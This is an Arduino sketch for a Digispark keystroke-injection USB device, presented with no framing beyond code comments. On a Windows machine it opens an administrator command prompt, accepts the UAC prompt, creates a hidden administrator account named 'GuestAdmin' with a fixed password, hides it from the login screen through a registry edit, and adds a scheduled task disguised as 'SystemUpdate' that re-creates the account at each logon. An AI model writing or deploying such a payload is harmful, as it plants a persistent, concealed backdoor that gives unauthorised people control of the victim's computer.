// Include the DigiKeyboard library
#include "DigiKeyboard.h"

void setup() {
  // Initiate DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);
  delay(5000); // Wait for 5 seconds

  // Open Command Prompt as Administrator
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  delay(500);
  DigiKeyboard.print("cmd");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // Ctrl+Shift+Enter
  delay(1000);

  // Confirm UAC prompt
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Left arrow to select 'Yes'
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Press Enter
  delay(1000);

  // Commands to create and hide the admin account
  DigiKeyboard.println("net user GuestAdmin P@ssw0rd /add");
  delay(500);
  DigiKeyboard.println("net localgroup Administrators GuestAdmin /add");
  delay(500);
  DigiKeyboard.println("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v GuestAdmin /t REG_DWORD /d 0 /f");
  delay(500);
  DigiKeyboard.println("schtasks /create /tn \"SystemUpdate\" /tr \"cmd /c net user GuestAdmin P@ssw0rd /add && net localgroup Administrators GuestAdmin /add\" /sc onlogon /rl highest /f");
  delay(500);

  // Close Command Prompt
  DigiKeyboard.println("exit");
}

void loop() {
  // Empty loop
}
